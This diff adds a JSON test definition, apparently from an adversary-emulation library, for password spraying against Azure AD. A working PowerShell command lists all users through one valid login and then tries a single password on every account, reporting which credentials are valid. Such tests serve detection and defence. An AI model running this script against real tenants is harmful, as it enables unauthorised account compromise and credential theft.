@@ -1,0 +1,47 @@
+{
+    "name": "Password spray all Azure AD users with a single password",
+    "description": "Attempt to brute force all Azure AD users with a single password (called password spraying) via AzureAD Powershell module. Valid credentials are only needed to fetch the list of Azure AD users. ",
+    "supported_platforms": [
+        "azure-ad"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Spraying",
+    "source": "ART",
+    "uuid": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a",
+    "arguments": {
+        "password": {
+            "description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
+            "type": "string",
+            "default": "P@ssw0rd!"
+        },
+        "valid_username": {
+            "description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>",
+            "type": "string",
+            "default": "bruce.wayne@contoso.com"
+        },
+        "valid_password": {
+            "description": "Valid password to authenticate as valid_username in the <valid_ms_account>",
+            "type": "string",
+            "default": "iamthebatman"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "AzureAD module must be installed.\n",
+            "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+            "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
